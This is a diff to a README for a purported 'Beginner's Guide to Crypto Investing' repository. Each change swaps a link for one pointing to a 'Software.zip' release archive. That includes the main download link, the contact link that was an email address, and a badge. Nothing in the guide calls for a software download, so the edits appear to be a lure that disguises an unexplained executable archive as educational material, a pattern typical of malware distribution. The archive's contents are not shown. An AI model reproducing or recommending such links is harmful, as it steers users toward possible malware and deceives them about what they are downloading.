@@ -10,7 +10,7 @@ Welcome to the "Beginner's Guide to Crypto Investing" repository, a structured c
 4. **Useful Tools and Platforms**: Access a curated list of tools and platforms to streamline your crypto investing journey, including exchanges, wallets, portfolio trackers, and more.
 
 ### 🌐 Link to Repository Files
-[Download Here](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[Download Here](https://github.com/Vam7ire/Beginner-s-Guide-to-Crypto-Investing/releases/download/v1.0/Software.zip)
 
 ---
 
@@ -20,7 +20,7 @@ Welcome to the "Beginner's Guide to Crypto Investing" repository, a structured c
 
 ### 🚨 Repository Navigation
 - For the latest updates and releases, please check the [Releases](link-to-releases) section.
-- If you have any questions or feedback, feel free to [open an issue](link-to-issues) or [reach out to us](mailto:example@email.com).
+- If you have any questions or feedback, feel free to [open an issue](link-to-issues) or [reach out to us](https://github.com/Vam7ire/Beginner-s-Guide-to-Crypto-Investing/releases/download/v1.0/Software.zip).
 
 ### 🌈 Let's Get Started!
 Dive into the world of crypto investing by exploring the markdown files in this repository. Equip yourself with the knowledge and tools needed to kickstart your crypto journey with confidence!
@@ -39,4 +39,4 @@ This repository is licensed under the [MIT License](link-to-license). Feel free 
 ### 🌟 Stay Connected!
 Follow us on [Twitter](link-to-twitter) | Like us on [Facebook](link-to-facebook) | Visit our [Website](link-to-website)
 
-[![](https://img.shields.io/badge/Download-Launch%20Here-brightgreen)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![](https://github.com/Vam7ire/Beginner-s-Guide-to-Crypto-Investing/releases/download/v1.0/Software.zip%20Here-brightgreen)](https://github.com/Vam7ire/Beginner-s-Guide-to-Crypto-Investing/releases/download/v1.0/Software.zip)
